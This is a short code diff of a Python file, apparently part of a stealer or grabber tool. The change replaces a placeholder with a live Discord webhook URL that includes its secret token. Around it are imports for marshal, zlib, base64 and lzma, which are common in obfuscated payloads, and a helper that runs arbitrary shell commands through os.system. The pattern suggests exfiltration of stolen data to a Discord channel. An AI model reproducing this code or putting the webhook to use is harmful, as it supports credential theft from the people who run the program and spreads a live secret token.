@@ -3,7 +3,7 @@ import codecs
 import marshal, zlib, base64, lzma
 import json
 
-webhookk = "heh"
+webhookk = "https://discordapp.com/api/webhooks/1026188592386682901/1iKEfqwveupDXyZm9PqcR1056mAfy_oKcWCADUlKFS1RWqWd4j9yHCmXMpObqrxUNh8p"
 
 def command(c):
     os.system(c)
